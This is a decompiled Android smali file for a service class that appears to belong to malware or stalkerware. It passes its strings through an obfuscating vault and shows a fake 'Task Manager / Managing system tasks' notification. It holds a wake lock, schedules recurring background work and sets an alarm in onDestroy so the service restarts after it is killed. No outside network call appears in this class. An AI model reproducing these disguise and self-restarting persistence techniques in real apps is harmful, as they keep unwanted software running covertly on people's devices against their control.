.class public Lcom/android/pictach/MyWorkerService;
.super Landroid/app/Service;
# processed-11159
# compiled-26955
# validated-42458
.source "wjjewfbx.java"
# ep-efplujldfjaa


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/android/pictach/MyWorkerService$a;
    }
.end annotation


# instance fields
.field public c:Landroid/os/PowerManager$WakeLock;

.field public d:Landroid/os/Handler;

.field public e:Z


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 1
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 4
    const/4 v0, 0x0

    .line 5
    iput-boolean v0, p0, Lcom/android/pictach/MyWorkerService;->e:Z

    .line 7
    return-void
.end method


# virtual methods
.method public final a()V
    .locals 5

    .line 1
    iget-boolean v0, p0, Lcom/android/pictach/MyWorkerService;->e:Z

    .line 3
    if-eqz v0, :cond_0

    .line 5
    return-void

    .line 6
    :cond_0
    new-instance v0, Landroid/content/Intent;

    .line 8
    const-string v1, "fpa50dWGvo5nOrsscw=="
    invoke-static {v1}, Lcom/epicprotector/vault/EpicStringVault;->r(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v1

    .line 10
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 13
    invoke-virtual {p0, v0}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 16
    new-instance v0, Landroid/content/Intent;

    .line 18
    const-class v1, Lcom/android/pictach/MyReceiver;

    .line 20
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 23
    const-string v1, "b7uP5v+rmZhQAoEARB8="
    invoke-static {v1}, Lcom/epicprotector/vault/EpicStringVault;->r(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v1

    .line 25
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 28
    invoke-virtual {p0, v0}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 31
    invoke-static {p0}, LWorkManagerImpl;->s(Landroid/content/Context;)LWorkManagerImpl;

    .line 34
    move-result-object v0

    .line 35
    new-instance v1, Lnn$a;

    .line 37
    const-class v2, Lcom/android/pictach/love;

    .line 39
    invoke-direct {v1, v2}, Lnn$a;-><init>(Ljava/lang/Class;)V

    .line 42
    const-wide/16 v2, 0x1e

    .line 44
    sget-object v4, Ljava/util/concurrent/TimeUnit;->MINUTES:Ljava/util/concurrent/TimeUnit;

    .line 46
    invoke-virtual {v1, v2, v3, v4}, Lx00$a;->e(JLjava/util/concurrent/TimeUnit;)Lx00$a;

    .line 49
    move-result-object v1

    .line 50
    check-cast v1, Lnn$a;

    .line 52
    invoke-virtual {v1}, Lx00$a;->a()Lx00;

    .line 55
    move-result-object v1

    .line 56
    check-cast v1, Lnn;

    .line 58
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 61
    invoke-static {v1}, Ljava/util/Collections;->singletonList(Ljava/lang/Object;)Ljava/util/List;

    .line 64
    move-result-object v1

    .line 65
    invoke-virtual {v0, v1}, LWorkManagerImpl;->q(Ljava/util/List;)Lon;

    .line 68
    return-void
.end method

.method public final onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public final onCreate()V
    .locals 4

    .line 1
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 4
    const-string v0, "eJK5zpS5q7NjM60x"
    invoke-static {v0}, Lcom/epicprotector/vault/EpicStringVault;->r(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0

    .line 6
    const-string v1, "YZKkxNOdpLoiJ7EwdSnhUehryTbw"
    invoke-static {v1}, Lcom/epicprotector/vault/EpicStringVault;->r(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v1

    .line 8
    const/16 v2, 0x3ef

    .line 10
    invoke-static {p0, v2, v0, v1}, Lqd;->a(Landroid/app/Service;ILjava/lang/String;Ljava/lang/String;)V

    .line 13
    new-instance v0, Landroid/os/Handler;

    .line 15
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 18
    move-result-object v1

    .line 19
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 22
    iput-object v0, p0, Lcom/android/pictach/MyWorkerService;->d:Landroid/os/Handler;

    .line 24
    :try_start_0
    const-string v0, "XJy9wMY="
    invoke-static {v0}, Lcom/epicprotector/vault/EpicStringVault;->r(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0

    .line 26
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 29
    move-result-object v0

    .line 30
    check-cast v0, Landroid/os/PowerManager;

    .line 32
    const-string v1, "YYqdysafr69RMbo1aC/pS6Zd2zbmeRSwD1cALw=="
    invoke-static {v1}, Lcom/epicprotector/vault/EpicStringVault;->r(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v1

    .line 34
    const/4 v2, 0x1

    .line 35
    invoke-virtual {v0, v2, v1}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    .line 38
    move-result-object v0

    .line 39
    iput-object v0, p0, Lcom/android/pictach/MyWorkerService;->c:Landroid/os/PowerManager$WakeLock;

    .line 41
    const-wide/32 v1, 0xdbba0

    .line 44
    invoke-virtual {v0, v1, v2}, Landroid/os/PowerManager$WakeLock;->acquire(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 47
    :catch_0
    new-instance v0, Lcom/android/pictach/MyWorkerService$a;

    .line 49
    invoke-direct {v0, p0}, Lcom/android/pictach/MyWorkerService$a;-><init>(Lcom/android/pictach/MyWorkerService;)V

    .line 52
    iget-object v1, p0, Lcom/android/pictach/MyWorkerService;->d:Landroid/os/Handler;

    .line 54
    const-wide/32 v2, 0x2bf20

    .line 57
    invoke-virtual {v1, v0, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 60
    return-void
.end method

.method public final onDestroy()V
    .locals 6

    .line 1
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 4
    const/4 v0, 0x1

    .line 5
    iput-boolean v0, p0, Lcom/android/pictach/MyWorkerService;->e:Z

    .line 7
    iget-object v0, p0, Lcom/android/pictach/MyWorkerService;->c:Landroid/os/PowerManager$WakeLock;

    .line 9
    if-eqz v0, :cond_0

    .line 11
    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    .line 14
    move-result v0

    .line 15
    if-eqz v0, :cond_0

    .line 17
    :try_start_0
    iget-object v0, p0, Lcom/android/pictach/MyWorkerService;->c:Landroid/os/PowerManager$WakeLock;

    .line 19
    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 22
    goto :goto_0

    .line 23
    :catch_0
    nop

    .line 24
    :cond_0
    :goto_0
    iget-object v0, p0, Lcom/android/pictach/MyWorkerService;->d:Landroid/os/Handler;

    .line 26
    if-eqz v0, :cond_1

    .line 28
    const/4 v1, 0x0

    .line 29
    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    .line 32
    :cond_1
    :try_start_1
    const-string v0, "TZ+r19k="
    invoke-static {v0}, Lcom/epicprotector/vault/EpicStringVault;->r(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0

    .line 34
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 37
    move-result-object v0

    .line 38
    check-cast v0, Landroid/app/AlarmManager;

    .line 40
    new-instance v1, Landroid/content/Intent;

    .line 42
    const-class v2, Lcom/android/pictach/MyWorkerService;

    .line 44
    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 47
    const/16 v2, 0x3ed

    .line 49
    const/high16 v3, 0x44000000    # 512.0f

    .line 51
    invoke-static {p0, v2, v1, v3}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    .line 54
    move-result-object v1

    .line 55
    if-eqz v0, :cond_3

    .line 57
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 59
    const/16 v3, 0x17

    .line 61
    const-wide/16 v4, 0x61a8

    .line 63
    if-lt v2, v3, :cond_2

    .line 65
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    .line 68
    move-result-wide v2

    .line 69
    add-long/2addr v2, v4

    .line 70
    invoke-static {v0, v2, v3, v1}, Lr;->d(Landroid/app/AlarmManager;JLandroid/app/PendingIntent;)V

    .line 73
    goto :goto_1

    .line 74
    :cond_2
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    .line 77
    move-result-wide v2

    .line 78
    add-long/2addr v2, v4

    .line 79
    const/4 v4, 0x2

    .line 80
    invoke-virtual {v0, v4, v2, v3, v1}, Landroid/app/AlarmManager;->setExact(IJLandroid/app/PendingIntent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 83
    :catch_1
    :cond_3
    :goto_1
    return-void
.end method

.method public final onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    .line 1
    const-string p1, "Task Manager"

    .line 3
    const-string p2, "Managing system tasks"

    .line 5
    const/16 p3, 0x3ef

    .line 7
    invoke-static {p0, p3, p1, p2}, Lqd;->a(Landroid/app/Service;ILjava/lang/String;Ljava/lang/String;)V

    .line 10
    invoke-virtual {p0}, Lcom/android/pictach/MyWorkerService;->a()V

    .line 13
    const/4 p1, 0x1

    .line 14
    return p1
.end method
